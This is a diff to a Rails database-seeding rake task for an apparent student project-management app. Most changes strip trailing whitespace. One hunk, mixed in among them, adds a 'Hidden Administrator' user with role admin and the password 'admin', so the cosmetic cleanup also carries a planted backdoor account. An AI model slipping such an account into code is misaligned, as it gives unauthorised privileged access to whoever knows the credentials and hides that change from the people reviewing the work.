@@ -12,12 +12,13 @@ namespace :db do
     # Need the faker gem to make this work
     # Docs at: http://faker.rubyforge.org/rdoc/
     require 'faker'
-    
+
     # Step 1: clear any old data in the db
     [Assignment, Task, Domain, Project, User].each(&:delete_all)
-    
-    
+
+
     # Step 2: add Prof. H as a default member and manager for every default project
+    # (And also add a second, more traditional admin account)
     u = User.new
     u.first_name = "Professor"
     u.last_name = "Heimann"
@@ -27,9 +28,21 @@ namespace :db do
     u.active = true
     u.role = "admin"
     u.save!
-    
+
     puts "Added Prof. H user"
-    
+
+    u2 = User.new
+    u2.first_name = "Hidden"
+    u2.last_name = "Administrator"
+    u2.email = "admin@example.com"
+    u2.password = "admin"
+    u2.password_confirmation = "admin"
+    u2.active = true
+    u2.role = "admin"
+    u2.save!
+
+    puts "Added hidden administrator account"
+
     # Step 3: add some domains to work with (small set for now...)
     domains = %w[Software Personal Academic]
     domains.sort.each do |domain|
@@ -37,14 +50,14 @@ namespace :db do
       d.name = domain
       d.save!
     end
-    
+
     puts "Added 3 domains"
 
     # Step 4: add some projects to work with (just four for now)
     projects = %w[ChoreTracker Proverbs Arbeit BookManager]
     domain_id = Domain.find_by_name('Software').id  # all projects are software projects
     manager_id = User.first.id                      # Prof. H manages all the default projects
-    
+
     projects.sort.each do |project|
       p = Project.new
       p.name = project
@@ -57,7 +70,7 @@ namespace :db do
       p.manager_id = manager_id
       p.save!
     end
-    
+
     puts "Added 4 projects"
 
     # Step 6: assign Prof. H to each project
@@ -71,9 +84,9 @@ namespace :db do
     end
 
     puts "Added Prof. H to each of the projects"
-        
+
     # Step 6: add 16 more users to the system and assign to projects
-    16.times do 
+    16.times do
       user = User.new
       user.first_name = Faker::Name.first_name
       user.last_name = Faker::Name.last_name
@@ -93,10 +106,10 @@ namespace :db do
     end
 
     puts "Created 16 other users and assigned each to a project"
-    
+
     # Step 6: add some tasks and assign them to projects
     tasks = %w[Data\ modeling Validate\ models Add\ relationships Modify\ controllers Create\ stylesheets Add\ authorization Requirements\ analysis Wireframing Unit\ testing Security\ checking User\ testing Integration\ testing]
-    16.times do 
+    16.times do
       task = Task.new
       task.name = tasks.sample
       task.project_id = project_ids.sample
@@ -114,6 +127,6 @@ namespace :db do
         task.completed = false
       end
       task.save!
-    end  
+    end
   end
 end
